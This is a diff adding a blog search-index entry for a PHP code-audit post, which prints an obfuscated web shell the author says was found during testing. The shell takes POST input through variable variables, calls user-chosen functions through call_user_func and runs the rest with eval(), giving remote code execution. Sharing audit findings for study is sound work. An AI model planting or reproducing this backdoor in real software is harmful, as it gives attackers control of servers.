@@ -79,4 +79,19 @@
         <tag>Pentesting Domain</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PHP CODE AUDIT - 0001 - AttckForWork</title>
+    <url>/2022/07/31/PHP-CODE-AUDIT-0001-AttckForWork/</url>
+    <content><![CDATA[<p>This php code was obtained during a code audit during my testing process. I was so excited when I saw this, I decided to copy it out for everyone to learn.</p>
+<h4 id="KnowLedGePoint"><a href="#KnowLedGePoint" class="headerlink" title="KnowLedGePoint"></a>KnowLedGePoint</h4><ul>
+<li>Count</li>
+<li>Error_reproting</li>
+<li>Sizeof</li>
+<li>Strlen</li>
+</ul>
+<hr>
+<h2 id="Call-user-func"><a href="#Call-user-func" class="headerlink" title="Call_user_func"></a>Call_user_func</h2><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$exec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$exec</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaaa</span> <span class="keyword">extends</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;phpinfo&quot;</span>,<span class="variable">$var</span>[<span class="number">0</span>](<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]));</span><br><span class="line">    <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$var</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aaaa</span>(<span class="variable">$$get</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+  </entry>
 </search>
